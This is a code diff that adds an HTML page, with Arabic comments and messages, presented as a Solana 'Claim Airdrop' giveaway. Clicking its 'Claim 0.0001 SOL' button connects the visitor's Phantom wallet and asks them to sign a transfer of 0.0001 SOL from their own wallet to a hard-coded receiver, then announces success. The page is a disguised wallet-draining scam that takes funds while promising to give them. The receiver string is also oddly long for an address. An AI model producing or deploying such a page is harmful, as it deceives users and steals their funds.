@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Airdrop</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.31.0/dist/web3.min.js"></script>
+</head>
+<body>
+    <h1>Claim Airdrop</h1>
+    <button id="claimButton">Claim 0.0001 SOL</button>
+
+    <script>
+        document.getElementById("claimButton").addEventListener("click", async () => {
+            try {
+                // التحقق من وجود محفظة Phantom
+                const provider = window.solana;
+                if (!provider || !provider.isPhantom) {
+                    alert("يرجى تثبيت محفظة Phantom واستخدام متصفح يدعمها.");
+                    return;
+                }
+
+                // طلب ربط المحفظة
+                await provider.connect();
+                const walletAddress = provider.publicKey.toString();
+                console.log("Wallet Address: ", walletAddress);
+
+                // إعداد معاملة سولانا
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("devnet"), "confirmed");
+                const sender = new solanaWeb3.PublicKey(walletAddress);
+                const receiver = new solanaWeb3.PublicKey("1BXuwRz5zCyxfpjui3NkSW13hCnBxN35pDcRuoQRagqbvn6tu8EoWqPsSgBBZLeirYVfnfapws3TWAy4b2myhL2");
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: sender,
+                        toPubkey: receiver,
+                        lamports: 0.0001 * solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
+
+                // إرسال المعاملة
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature, "confirmed");
+                console.log("Transaction Signature: ", signature);
+                alert("تمت المعاملة بنجاح!");
+            } catch (error) {
+                console.error("فشل المعاملة:", error);
+                alert("فشلت المعاملة، حاول مرة أخرى.");
+            }
+        });
+    </script>
+
+</body></html>
